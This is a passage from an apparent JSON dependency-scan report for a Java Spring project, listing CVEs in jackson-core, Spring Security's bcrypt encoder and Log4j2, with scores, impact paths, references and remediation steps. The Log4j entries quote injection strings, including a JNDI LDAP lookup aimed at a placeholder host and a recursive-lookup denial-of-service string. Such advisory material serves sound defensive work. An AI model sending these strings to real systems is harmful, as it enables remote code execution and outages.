        "summary": "jackson-core contains core low-level incremental (\"streaming\") parser and generator abstractions used by Jackson Data Processor. In versions prior to 2.15.0, if a user parses an input file and it has deeply nested data, Jackson could end up throwing a StackoverflowError if the depth is particularly large. jackson-core 2.15.0 contains a configurable limit for how deep Jackson will traverse in an input document, defaulting to an allowable depth of 1000. jackson-core will throw a StreamConstraintsException if the limit is reached. jackson-databind also benefits from this change because it uses jackson-core to parse JSON inputs. As a workaround, users should avoid parsing input files from untrusted sources.",
        "severity": "High",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-core:2.13.5": {
            "fixed_versions": [
              "[2.15.0]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-ui:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-webmvc-core:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-common:1.8.0"
                },
                {
                  "component_id": "gav://io.swagger.core.v3:swagger-core:2.2.20"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.dataformat:jackson-dataformat-yaml:2.13.5"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-core:2.13.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-707194",
        "references": [
          "https://github.com/FasterXML/jackson-core/pull/943",
          "https://nvd.nist.gov/vuln/detail/CVE-2025-52999",
          "https://github.com/FasterXML/jackson-core/security/advisories/GHSA-h46c-h94j-95f3",
          "https://github.com/advisories/GHSA-h46c-h94j-95f3"
        ],
        "extended_information": {}
      },
      {
        "cves": [
          {
            "cve": "CVE-2025-22228",
            "cvss_v3_score": "7.4",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
            "cwe": [
              "CWE-521",
              "CWE-287"
            ]
          }
        ],
        "summary": "BCryptPasswordEncoder.matches(CharSequence,String) will incorrectly return true for passwords larger than 72 characters as long as the first 72 characters are the same.",
        "severity": "High",
        "components": {
          "gav://org.springframework.security:spring-security-crypto:5.7.11": {
            "fixed_versions": [
              "[5.7.16]",
              "[5.8.18]",
              "[6.0.16]",
              "[6.1.14]",
              "[6.2.10]",
              "[6.3.8]",
              "[6.4.4]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-security:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.security:spring-security-config:5.7.11"
                },
                {
                  "component_id": "gav://org.springframework.security:spring-security-core:5.7.11"
                },
                {
                  "component_id": "gav://org.springframework.security:spring-security-crypto:5.7.11"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-security:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.security:spring-security-web:5.7.11"
                },
                {
                  "component_id": "gav://org.springframework.security:spring-security-core:5.7.11"
                },
                {
                  "component_id": "gav://org.springframework.security:spring-security-crypto:5.7.11"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-678148",
        "references": [
          "https://nvd.nist.gov/vuln/detail/CVE-2025-22228",
          "https://security.netapp.com/advisory/ntap-20250425-0009",
          "https://security.netapp.com/advisory/ntap-20250425-0009/",
          "https://spring.io/security/cve-2025-22228",
          "https://github.com/advisories/GHSA-mg83-c7gq-rv5c",
          "https://github.com/spring-projects/spring-security/commit/46f0dc6dfc8402cd556c598fdf2d31f9d46cdbf3"
        ],
        "extended_information": {
          "short_description": "A design problem in Spring Security may help achieve authentication bypass when using the bcrypt password encoder.",
          "jfrog_research_severity": "Medium",
          "jfrog_research_severity_reasons": [
            {
              "name": "No high-impact exploit or technical writeup were published, and exploitation of the issue with high impact is either non-trivial or completely unproven",
              "description": "Exploitation of this vulnerability requires the attacker to know (or bruteforce) the first 72 characters of a password.",
              "is_positive": true
            },
            {
              "name": "The issue can be exploited by attackers over the network"
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "For this vulnerability to be present, a password which is longer than 72 characters must be used for a user.",
              "is_positive": true
            },
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "Exploitation of this vulnerability requires the attacker to know the first 72 characters of a password, which is dangerous and undesired by itself.",
              "is_positive": true
            }
          ]
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2021-45105",
            "cvss_v2_score": "4.3",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:N/I:N/A:P",
            "cvss_v3_score": "5.9",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cwe": [
              "CWE-20",
              "CWE-674"
            ]
          }
        ],
        "summary": "Apache Log4j2 versions 2.0-alpha1 through 2.16.0 (excluding 2.12.3 and 2.3.1) did not protect from uncontrolled recursion from self-referential lookups. This allows an attacker with control over Thread Context Map data to cause a denial of service when a crafted string is interpreted. This issue was fixed in Log4j 2.17.0, 2.12.3, and 2.3.1.",
        "severity": "Medium",
        "components": {
          "gav://org.apache.logging.log4j:log4j-core:2.11.2": {
            "fixed_versions": [
              "[2.12.3]",
              "[2.17.0]",
              "[2.3.1]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.apache.logging.log4j:log4j-core:2.11.2"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.apache.logging.log4j:log4j-slf4j-impl:2.14.1"
                },
                {
                  "component_id": "gav://org.apache.logging.log4j:log4j-core:2.11.2"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-589878",
        "references": [
          "https://github.com/advisories/GHSA-p6xc-xr62-6r2g",
          "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-apache-log4j-qRuKNEbd",
          "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-apache-log4j-qRuKNEbd",
          "https://www.zerodayinitiative.com/advisories/ZDI-21-1541",
          "https://www.debian.org/security/2021/dsa-5024",
          "https://cert-portal.siemens.com/productcert/pdf/ssa-479842.pdf",
          "https://security.netapp.com/advisory/ntap-20211218-0001/",
          "https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2021-0032",
          "https://logging.apache.org/log4j/2.x/security.html",
          "https://www.zerodayinitiative.com/advisories/ZDI-21-1541/",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/SIG7FZULMNK2XF6FZRU4VWYDQXNMUGAJ",
          "https://nvd.nist.gov/vuln/detail/CVE-2021-45105",
          "https://www.kb.cert.org/vuls/id/930724",
          "https://www.oracle.com/security-alerts/cpuapr2022.html",
          "https://cert-portal.siemens.com/productcert/pdf/ssa-501673.pdf",
          "http://www.openwall.com/lists/oss-security/2021/12/19/1",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/EOKPQGV24RRBBI4TBZUDQMM4MEH7MXCY",
          "https://security.netapp.com/advisory/ntap-20211218-0001",
          "https://lists.debian.org/debian-lts-announce/2021/12/msg00017.html",
          "https://www.oracle.com/security-alerts/cpujul2022.html",
          "https://www.oracle.com/security-alerts/cpujan2022.html"
        ],
        "extended_information": {
          "short_description": "An infinite recursion in Log4j2 leads to denial of service in non-default configurations.",
          "full_description": "Log4j2 is vulnerable to an infinite recursion in its string substitution mechanism.\nIn non-default configurations, an attacker might have control over non-message parts of a pattern layout (similar prerequisites to CVE-2021-45046). If the attacker then provides a string such as `${${::-${::-$${::-j}}}}`, Log4j2's substitution logic will detect an infinite loop and throw a `IllegalStateException`. Most web frameworks (for example \"Apache Tomcat\") will catch this exception and the app will not crash.\nNote that none of the previous mitigations offered in versions 2.15.0 and 2.16.0 are relevant for this issue, since this issue is in the string substitution mechanism and not directly related to message lookup or JNDI/LDAP.",
          "jfrog_research_severity": "Low",
          "jfrog_research_severity_reasons": [
            {
              "name": "The issue cannot result in a severe impact (such as remote code execution)",
              "description": "Application-specific denial of service (not system-wide)",
              "is_positive": true
            },
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "A non-default configuration must exist that allows the attacker to control non-message parts of the pattern layout",
              "is_positive": true
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must understand which remote input propagates to one of the message lookup bypasses",
              "is_positive": true
            },
            {
              "name": "The issue has an exploit published"
            }
          ]
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2021-45046",
            "cvss_v2_score": "5.1",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:H/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "9.0",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H",
            "cwe": [
              "CWE-917",
              "CWE-502"
            ]
          }
        ],
        "summary": "It was found that the fix to address CVE-2021-44228 in Apache Log4j 2.15.0 was incomplete in certain non-default configurations. This could allows attackers with control over Thread Context Map (MDC) input data when the logging configuration uses a non-default Pattern Layout with either a Context Lookup (for example, $${ctx:loginId}) or a Thread Context Map pattern (%X, %mdc, or %MDC) to craft malicious input data using a JNDI Lookup pattern resulting in an information leak and remote code execution in some environments and local code execution in all environments. Log4j 2.16.0 (Java 8) and 2.12.2 (Java 7) fix this issue by removing support for message lookup patterns and disabling JNDI functionality by default.",
        "severity": "Critical",
        "components": {
          "gav://org.apache.logging.log4j:log4j-core:2.11.2": {
            "fixed_versions": [
              "[2.12.2]",
              "[2.16.0]",
              "[2.3.1]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.apache.logging.log4j:log4j-core:2.11.2"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.apache.logging.log4j:log4j-slf4j-impl:2.14.1"
                },
                {
                  "component_id": "gav://org.apache.logging.log4j:log4j-core:2.11.2"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-192126",
        "references": [
          "https://www.openwall.com/lists/oss-security/2021/12/14/4",
          "https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2021-0032",
          "https://cert-portal.siemens.com/productcert/pdf/ssa-714170.pdf",
          "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-apache-log4j-qRuKNEbd",
          "http://www.openwall.com/lists/oss-security/2021/12/15/3",
          "http://www.openwall.com/lists/oss-security/2021/12/18/1",
          "https://logging.apache.org/log4j/2.x/security.html",
          "https://www.cve.org/CVERecord?id=CVE-2021-44228",
          "https://www.oracle.com/security-alerts/cpujul2022.html",
          "https://cert-portal.siemens.com/productcert/pdf/ssa-397453.pdf",
          "https://cert-portal.siemens.com/productcert/pdf/ssa-479842.pdf",
          "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/EOKPQGV24RRBBI4TBZUDQMM4MEH7MXCY/",
          "https://www.oracle.com/security-alerts/cpuapr2022.html",
          "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/SIG7FZULMNK2XF6FZRU4VWYDQXNMUGAJ/",
          "https://www.debian.org/security/2021/dsa-5022",
          "https://nvd.nist.gov/vuln/detail/CVE-2021-45046",
          "https://www.oracle.com/security-alerts/cpujan2022.html",
          "https://security.gentoo.org/glsa/202310-16",
          "https://www.oracle.com/security-alerts/alert-cve-2021-44228.html",
          "https://cert-portal.siemens.com/productcert/pdf/ssa-661247.pdf",
          "https://github.com/advisories/GHSA-jfh8-c2jp-5v3q",
          "http://www.openwall.com/lists/oss-security/2021/12/14/4",
          "https://github.com/advisories/GHSA-7rjr-3q55-vv33",
          "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-apache-log4j-qRuKNEbd",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/SIG7FZULMNK2XF6FZRU4VWYDQXNMUGAJ",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/EOKPQGV24RRBBI4TBZUDQMM4MEH7MXCY",
          "https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00646.html",
          "https://www.kb.cert.org/vuls/id/930724"
        ],
        "extended_information": {
          "short_description": "A mitigation bypass in log4j leads to remote code execution under rare preconditions.",
          "full_description": "This CVE was initially reported as a \"Low\" impact CVE (CVSS 3.7) but was later upgraded to \"Critical\" (CVSS 9.0) due to discovered mitigation bypasses in Log4j2 2.15.0 that changed the impact from \"Local DoS\" to \"Remote Code Execution\".\n\nThe main impact of CVE-2021-45046 is allowing for Log4j2 message lookups to be used, even in cases where they have been disabled.\nThe message lookup mechanism is disabled in the following cases - \n1.  Log4j2 versions between 2.10.0 and 2.14.1 (inclusive), when the `LOG4J_FORMAT_MSG_NO_LOOKUPS` or `log4j2.noFormatMsgLookup` mitigations have been enabled.\n\n2. Log4j2 version 2.15.0 (by default).\n\nCVE-2021-45046 revealed that the above mitigations only affect the message part of the pattern layout. However - in some non-default Log4j2 configurations, the attacker may have control over non-message parts of the pattern layout.\n\nExploitation of CVE-2021-45046 (which means - bypass of the above mitigation) results in remote code execution for all relevant Log4j2 versions.\n\nExamples of known vulnerable Log4j2 configurations - \n1. `ThreadContext`\nExample pattern layout:\n`appender.console.layout.pattern = ${ctx:tainted} - %d{yyyy-MM-dd HH:mm:ss} %-5p %c{1}:%L - %m%n`\nExample java code passing user-controlled data (TAINTED):\n```java\nThreadContext.put(\"tainted\", TAINTED);\nlogger.error(\"FOO\");\n```\n\n2. `MapMessage`\nExample pattern layout:\n`appender.console.layout.pattern = ${map:tainted} - %-5p %c{1}:%L - %m%n`\nExample Java code passing user-controlled data (TAINTED):\n```java\nMapMessage msg = new StringMapMessage().with(\"message\", \"H\").with(\"tainted\", TAINTED);\nlogger.error(msg);\n```\n\n3. `Jackson` (only if [Jackson](https://github.com/FasterXML/jackson)) is in the application's classpath) \nExample pattern layout:\n`appender.console.layout.pattern = ${map:tainted} - %-5p %c{1}:%L - %m%n`\nExample Java code passing user-controlled data (TAINTED):\n```java\nlogger.info(new ObjectMessage(TAINTED));\n```\n\n4. `StructuredDataMessage`\nExample pattern layout:\n`appender.console.layout.pattern = ${sd:tainted} - %-5p %c{1}:%L - %m%n`\nExample Java code passing user-controlled data (TAINTED):\n```java\nStructuredDataMessage m = new StructuredDataMessage(\"1\", \"H\", \"event\");\nm.put(\"tainted\", TAINTED);\nlogger.error(m);\n```\n\nPlease see [JFrog's blogpost appendix C](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/#appendix-c) for more details",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The issue results in a severe impact (such as remote code execution)"
            },
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "A non-default configuration must exist that allows the attacker to control non-message parts of the pattern layout",
              "is_positive": true
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must understand which remote input propagates to one of the message lookup bypasses",
              "is_positive": true
            },
            {
              "name": "The issue has an exploit published"
            }
          ],
          "remediation": "##### Deployment mitigations\n\nIn the vulnerable application, override the `org.apache.logging.log4j.core.lookup.JndiLookup` function with an empty function, or alternatively remove the class statically from the JAR file by running `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`\n\nOR\n\nUpgrade your Java runtime to one of the following versions (or any later version):\n6u211, 7u201, 8u191, 11.0.1.\n(This mitigation can be bypassed in some local configurations, please see [JFrog's blogpost Appendix B](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/#appendix-b))"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2021-44228",
            "cvss_v2_score": "9.3",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:C/I:C/A:C",
            "cvss_v3_score": "10.0",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
            "cwe": [
              "CWE-20",
              "CWE-502",
              "CWE-917",
              "CWE-400"
            ]
          }
        ],
        "summary": "Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects.",
        "severity": "Critical",
        "components": {
          "gav://org.apache.logging.log4j:log4j-core:2.11.2": {
            "fixed_versions": [
              "[2.12.2]",
              "[2.15.0]",
              "[2.3.1]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.apache.logging.log4j:log4j-core:2.11.2"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.apache.logging.log4j:log4j-slf4j-impl:2.14.1"
                },
                {
                  "component_id": "gav://org.apache.logging.log4j:log4j-core:2.11.2"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-191654",
        "references": [
          "https://seclists.org/fulldisclosure/2022/Jul/11",
          "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-apache-log4j-qRuKNEbd",
          "https://packetstormsecurity.com/files/165673/UniFi-Network-Application-Unauthenticated-Log4Shell-Remote-Code-Execution.html",
          "https://github.com/advisories/GHSA-94g7-hpv8-h9qm",
          "https://github.com/github/advisory-database/pull/5501",
          "https://seclists.org/fulldisclosure/2022/Dec/2",
          "https://packetstormsecurity.com/files/167917/MobileIron-Log4Shell-Remote-Command-Execution.html",
          "https://packetstormsecurity.com/files/171626/AD-Manager-Plus-7122-Remote-Code-Execution.html",
          "https://packetstormsecurity.com/files/167794/Open-Xchange-App-Suite-7.10.x-Cross-Site-Scripting-Command-Injection.html",
          "https://seclists.org/fulldisclosure/2022/Mar/23",
          "https://logging.apache.org/log4j/2.x/security.html",
          "https://cert-portal.siemens.com/productcert/pdf/ssa-661247.pdf",
          "https://docs.opencast.org/r/9.x/admin/#changelog/#opencast-910",
          "https://logging.apache.org/log4j/2.x/manual/migration.html",
          "https://github.com/cisagov/log4j-affected-db",
          "https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2021-0032",
          "https://github.com/opencast/opencast/security/advisories/GHSA-mf4f-j588-5xm8",
          "https://issues.apache.org/jira/browse/LOG4J2-3214",
          "https://github.com/tangxiaofeng7/apache-log4j-poc",
          "http://www.openwall.com/lists/oss-security/2021/12/13/1",
          "https://github.com/advisories/GHSA-jfh8-c2jp-5v3q",
          "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
          "https://www.debian.org/security/2021/dsa-5020",
          "https://support.apple.com/kb/HT213189",
          "http://www.openwall.com/lists/oss-security/2021/12/13/2",
          "https://github.com/cisagov/log4j-affected-db/blob/develop/SOFTWARE-LIST.md",
          "https://github.com/hazelcast/hazelcast/security/advisories/GHSA-v57x-gxfj-484q",
          "http://www.openwall.com/lists/oss-security/2021/12/10/3",
          "https://lists.debian.org/debian-lts-announce/2021/12/msg00007.html",
          "https://github.com/averbis/pear-archetype/security/advisories/GHSA-j7c3-96rf-jrrp",
          "https://www.oracle.com/security-alerts/cpujan2022.html",
          "https://github.com/advisories/GHSA-7rjr-3q55-vv33",
          "https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00646.html",
          "https://www.nu11secur1ty.com/2021/12/cve-2021-44228.html",
          "http://packetstormsecurity.com/files/165371/VMware-Security-Advisory-2021-0028.4.html",
          "https://logging.apache.org/log4j/2.x/manual/lookups.html#JndiLookup",
          "https://github.com/splunk/splunk-library-javalogging/security/advisories/GHSA-94g7-hpv8-h9qm",
          "http://packetstormsecurity.com/files/165282/Log4j-Payload-Generator.html",
          "https://www.oracle.com/security-alerts/alert-cve-2021-44228.html",
          "https://security.netapp.com/advisory/ntap-20211210-0007/",
          "http://packetstormsecurity.com/files/165642/VMware-vCenter-Server-Unauthenticated-Log4Shell-JNDI-Injection-Remote-Code-Execution.html",
          "http://packetstormsecurity.com/files/171626/AD-Manager-Plus-7122-Remote-Code-Execution.html",
          "https://cert-portal.siemens.com/productcert/pdf/ssa-714170.pdf",
          "https://issues.apache.org/jira/browse/LOG4J2-3201",
          "https://github.com/averbis/pear-archetype/commit/6815f5981c836ab8c345a6ff54f29e9f4b67f7eb",
          "https://logging.apache.org/log4j/2.x/changes-report.html#a2.15.0",
          "https://github.com/apache/logging-log4j2/pull/608",
          "http://packetstormsecurity.com/files/165260/VMware-Security-Advisory-2021-0028.html",
          "http://packetstormsecurity.com/files/165673/UniFi-Network-Application-Unauthenticated-Log4Shell-Remote-Code-Execution.html",
          "http://packetstormsecurity.com/files/165307/Log4j-Remote-Code-Execution-Word-Bypassing.html",
          "http://packetstormsecurity.com/files/165281/Log4j2-Log4Shell-Regexes.html",
          "https://www.bentley.com/en/common-vulnerability-exposure/be-2022-0001",
          "https://github.com/opencast/opencast",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/M5CSVUNV4HWZZXGOKNSK6L7RPM7BOKIB",
          "https://cert-portal.siemens.com/productcert/pdf/ssa-397453.pdf",
          "https://msrc-blog.microsoft.com/2021/12/11/microsofts-response-to-cve-2021-44228-apache-log4j2",
          "http://packetstormsecurity.com/files/165532/Log4Shell-HTTP-Header-Injection.html",
          "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/VU57UJDCFIASIO35GC55JMKSRXJMCDFM/",
          "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-apache-log4j-qRuKNEbd",
          "https://security.netapp.com/advisory/ntap-20211210-0007",
          "https://www.kb.cert.org/vuls/id/930724",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VU57UJDCFIASIO35GC55JMKSRXJMCDFM",
          "https://docs.opencast.org/r/10.x/admin/#changelog/#opencast-106",
          "http://packetstormsecurity.com/files/167917/MobileIron-Log4Shell-Remote-Command-Execution.html",
          "https://twitter.com/kurtseifried/status/1469345530182455296",
          "http://www.openwall.com/lists/oss-security/2021/12/10/2",
          "http://seclists.org/fulldisclosure/2022/Jul/11",
          "http://www.openwall.com/lists/oss-security/2021/12/10/1",
          "https://github.com/hazelcast/hazelcast",
          "https://github.com/averbis/pear-archetype",
          "http://packetstormsecurity.com/files/167794/Open-Xchange-App-Suite-7.10.x-Cross-Site-Scripting-Command-Injection.html",
          "https://issues.apache.org/jira/browse/LOG4J2-3221",
          "https://www.oracle.com/security-alerts/cpuapr2022.html",
          "http://seclists.org/fulldisclosure/2022/Mar/23",
          "https://github.com/nu11secur1ty/CVE-mitre/tree/main/CVE-2021-44228",
          "https://github.com/opencast/opencast/pull/3253",
          "https://msrc-blog.microsoft.com/2021/12/11/microsofts-response-to-cve-2021-44228-apache-log4j2/",
          "http://packetstormsecurity.com/files/165311/log4j-scan-Extensive-Scanner.html",
          "http://packetstormsecurity.com/files/165225/Apache-Log4j2-2.14.1-Remote-Code-Execution.html",
          "https://cert-portal.siemens.com/productcert/pdf/ssa-479842.pdf",
          "http://packetstormsecurity.com/files/165261/Apache-Log4j2-2.14.1-Information-Disclosure.html",
          "http://packetstormsecurity.com/files/165306/L4sh-Log4j-Remote-Code-Execution.html",
          "http://www.openwall.com/lists/oss-security/2021/12/15/3",
          "https://issues.apache.org/jira/browse/LOG4J2-3198",
          "http://packetstormsecurity.com/files/165270/Apache-Log4j2-2.14.1-Remote-Code-Execution.html",
          "http://www.openwall.com/lists/oss-security/2021/12/14/4",
          "http://seclists.org/fulldisclosure/2022/Dec/2",
          "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/M5CSVUNV4HWZZXGOKNSK6L7RPM7BOKIB/"
        ],
        "extended_information": {
          "short_description": "An unsafe deserialization in log4j leads to Java code injection when logging a crafted string.",
          "full_description": "[Apache Log4j](https://logging.apache.org/log4j/2.x/) is a ubiquitous Java-based logging framework.\n\nDue to the `JndiLookup` message lookup feature supported by default in log4j \u003c 2.15.0, \nAn application that uses Log4j  2.0.0-2.14.1 can be remotely exploited if a remote attacker can cause arbitrary strings to be logged. Specifically, an attacker must be able to supply a partial string to one of the logging APIs - `logger.info()`, `logger.debug()`, `logger.error()`, `logger.fatal()`, `logger.log()`, `logger.trace()` or `logger.warn()`.\n\nWhen an attacker sends a JNDI lookup string such as - `${jndi:ldap://\u003chostname\u003e:\u003cport\u003e/foo}`, log4j will attempt to load an arbitrary class from the supplied JNDI host which leads to arbitrary Java code injection. There are many public implementations of malicious LDAP JNDI servers that can serve any attacker code, such as the one by [marshalsec](https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java).\n\nDue to ease of exploitation, the vulnerability has been reported to be exploited in the wild, and many exploit PoCs are available on Github.\n\nNote that Java runtimes of version 6u211, 7u201, 8u191, 11.0.1 or any later version are not susceptible to the LDAP-based exploit, since JNDI cannot load a remote codebase using LDAP (due to the `com.sun.jndi.ldap.object.trustURLCodebase` configuration).\n\nThe affected Maven package is [log4j-core](https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core).",
          "jfrog_research_severity": "Critical",
          "jfrog_research_severity_reasons": [
            {
              "name": "The issue has multiple mentions in general media"
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "Remote code execution"
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must understand which remote input propagates to one of the log4j logging functions",
              "is_positive": true
            },
            {
              "name": "The prerequisites for exploiting the issue are either extremely common or nonexistent (always exploitable)",
              "description": "Remote input can often make its way to logging functions"
            },
            {
              "name": "The issue has an exploit published"
            }
          ],
          "remediation": "##### Deployment mitigations\n\nUpgrade your Java runtime to one of the following versions (or any later version):\n6u211, 7u201, 8u191, 11.0.1.\n\nThis method is less recommended than the other deployment mitigations, since it only protects against the LDAP exploit (which is the widely published exploit), but potentially leaves other context-dependent JNDI injections open.\n\n##### Deployment mitigations\n\n**Method 1 - Disabling Lookups in log messages:**\nIf using log4j 2.10.0 or any later version, add the following (JVM) command-line flag when running the vulnerable Java application: `‐Dlog4j2.formatMsgNoLookups=True`\n\nAlternatively, this can be configured globally by setting the environment variable `LOG4J_FORMAT_MSG_NO_LOOKUPS` to `true` by executing this command before Java applications are loaded:\n```\nexport LOG4J_FORMAT_MSG_NO_LOOKUPS=true\n```\n\n**Method 2: Removing the vulnerable class:**\nIf using an older log4j version, remove the `JndiLookup` class from any Java applications by executing this:\n```\nfind ./ -type f -name \"*.jar\" -exec zip -q -d \"{}\" org/apache/logging/log4j/core/lookup/JndiLookup.class \\;\n```\nThis will recursively find all JAR files in the current directory and remove the vulnerable `JndiLookup` class from them. It is recommended to execute this command on the root directory of your project or server.\n\nNote: This method is recommended only as last resort. It is possible that the vulnerable `JndiLookup` class is embedded in a recursive JAR files or in locations that the zip command is not accessible to. When choosing this method, it is highly recommended to verify munally that no `JndiLookup.class` are left in any Java application."
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2021-44832",
            "cvss_v2_score": "8.5",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:S/C:C/I:C/A:C",
            "cvss_v3_score": "6.6",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-74",
              "CWE-20"
            ]
          }
        ],
        "summary": "Apache Log4j2 versions 2.0-beta7 through 2.17.0 (excluding security fix releases 2.3.2 and 2.12.4) are vulnerable to a remote code execution (RCE) attack when a configuration uses a JDBC Appender with a JNDI LDAP data source URI when an attacker has control of the target LDAP server. This issue is fixed by limiting JNDI data source names to the java protocol in Log4j2 versions 2.17.1, 2.12.4, and 2.3.2.",
        "severity": "Medium",
        "components": {
          "gav://org.apache.logging.log4j:log4j-core:2.11.2": {
            "fixed_versions": [
              "[2.12.4]",
              "[2.17.1]",
              "[2.3.2]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.apache.logging.log4j:log4j-core:2.11.2"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.apache.logging.log4j:log4j-slf4j-impl:2.14.1"
                },
                {
                  "component_id": "gav://org.apache.logging.log4j:log4j-core:2.11.2"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-193174",
        "references": [
          "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-apache-log4j-qRuKNEbd",
          "https://github.com/advisories/GHSA-8489-44mv-ggj8",
          "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/T57MPJUW3MA6QGWZRTMCHHMMPQNVKGFC/",
